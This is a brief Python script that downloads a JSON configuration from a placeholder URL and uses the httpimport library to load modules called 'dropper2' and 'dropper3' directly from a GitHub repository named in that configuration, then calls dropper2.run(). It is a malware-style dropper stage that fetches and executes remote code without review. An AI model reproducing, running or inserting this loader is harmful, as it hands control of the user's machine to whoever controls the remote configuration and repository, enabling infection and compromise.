import httpimport, requests, json
config_url = "CONFIG_URL"
config_text = requests.get(config_url).text
config = json.loads(config_text)
with httpimport.github_repo(config["module_config"]["github_username"], config["module_config"]["github_repo"], module="dropper3"):
    with httpimport.github_repo(config["module_config"]["github_username"], config["module_config"]["github_repo"], module="dropper2"):
        import dropper2
        dropper2.run()